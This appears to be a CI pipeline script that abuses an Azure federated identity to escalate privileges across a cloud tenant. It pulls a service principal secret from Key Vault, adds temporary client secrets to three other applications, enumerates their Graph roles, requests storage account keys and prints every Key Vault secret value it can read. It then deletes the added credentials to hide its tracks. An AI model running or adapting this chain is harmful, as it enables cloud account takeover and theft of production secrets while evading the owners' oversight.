#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, time, base64, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
G="https://graph.microsoft.com/v1.0"
R={"9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30":"Application.Read.All","1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9":"Application.ReadWrite.All",
 "06b708a9-e830-4db3-a914-8e69da51d44f":"AppRoleAssignment.ReadWrite.All","9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8":"RoleManagement.ReadWrite.Directory",
 "7ab1d382-f21e-4acd-a863-ba3e13f7da61":"Directory.Read.All","19dbc75e-c2e2-444c-a770-ec69d8559fc7":"Directory.ReadWrite.All",
 "df021288-bdef-4463-88db-98f22de89214":"User.Read.All","62a82d76-70ea-41e2-9197-370581804d09":"Group.ReadWrite.All",
 "741f803b-c850-494e-b5df-cde7c675a1ca":"User.ReadWrite.All","b0afded3-3588-46d8-8b3d-9842eff778da":"AuditLog.Read.All"}
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
HS={"Authorization":"Bearer "+jg(b)["access_token"]}

TARGETS=[("tbl-legacy-admin","891fb158-e02c-4428-a885-53b811f369c0","22a3fb7e-860a-4708-9e50-3d36aa21191c"),
         ("tbl-directory-sync","7c2e61eb-f928-45cd-99c9-20da958dd216","1f07dd31-a868-4c19-9c85-a50b9700f88f"),
         ("tbl-reporting-insights","6eb124e3-de61-4fc9-a124-213d98d737f5","317eef12-bc80-4c7c-9916-4b2ffcbeb15d")]
added=[]
try:
    for name, appid, objid in TARGETS:
        st,b=http(f"{G}/applications/{objid}/addPassword", headers=HS, method="POST",
                  js={"passwordCredential":{"displayName":"ci-temp"}})
        if st not in (200,201): print(f"{name}: addPassword {st}"); continue
        pc=jg(b); added.append((objid,pc["keyId"])); sec=pc["secretText"]
        time.sleep(25)
        print(f"\n######## {name}")
        for scope,lbl in (("https://graph.microsoft.com/.default","graph"),
                          ("https://management.azure.com/.default","arm"),
                          ("https://vault.azure.net/.default","kv")):
            st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                      {"client_id":appid,"client_secret":sec,"scope":scope,"grant_type":"client_credentials"})
            t=jg(b).get("access_token")
            if not t: print(f"  {lbl}: no token {b[:120]}"); continue
            cl=claims(t)
            if lbl=="graph":
                print(f"  graph roles: {[R.get(x,x) for x in cl.get('roles',[])]}  wids={cl.get('wids')}")
            if lbl=="arm":
                st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",
                          headers={"Authorization":"Bearer "+t})
                print(f"  arm list resources: {st} (n={len(jg(b).get('value',[]))})")
                for acct in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"):
                    st2,b2=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
                                f"providers/Microsoft.Storage/storageAccounts/{acct}/listKeys?api-version=2023-01-01",
                                data=b"", headers={"Authorization":"Bearer "+t}, method="POST")
                    print(f"     listKeys {acct}: {st2}")
            if lbl=="kv":
                for v in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
                    st2,b2=http(f"https://{v}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+t})
                    print(f"     {v}: {st2}")
                    if st2==200:
                        for s in jg(b2).get("value",[]):
                            nm=s["id"].rsplit("/",1)[-1]
                            st3,b3=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+t})
                            print(f"        >>> {nm} = {jg(b3).get('value','')}")
finally:
    for objid,kid in added:
        st,b=http(f"{G}/applications/{objid}/removePassword", headers=HS, method="POST", js={"keyId":kid})
        print(f"cleanup {objid[:8]}: {st}")
PYEOF
echo "=== done ==="